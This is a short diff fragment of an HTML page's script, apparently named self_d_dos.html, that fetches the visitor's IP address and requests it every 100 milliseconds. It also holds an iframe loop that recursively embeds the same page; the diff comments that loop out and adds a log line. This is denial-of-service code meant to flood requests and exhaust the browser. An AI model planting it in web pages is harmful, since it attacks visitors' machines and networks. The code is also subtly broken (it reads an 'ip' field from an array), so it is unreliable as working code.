@@ -8,16 +8,19 @@ fetch("https://api.ipify.org/?format=jsonp&callback=JSON.parse")
 .then(t=>{
 setInterval(()=>{
   let j = [t]
+  console.log(j)
 fetch(j.ip)
 },100)
 })
 
 //Multiply iframes
+  /*
 setInterval(()=>{
 let i = document.createElement("iframe")
 i.src="self_d_dos.html"
 document.body.appendChild(i)
 },100)
+*/
 </script>
 </body>
 </html>
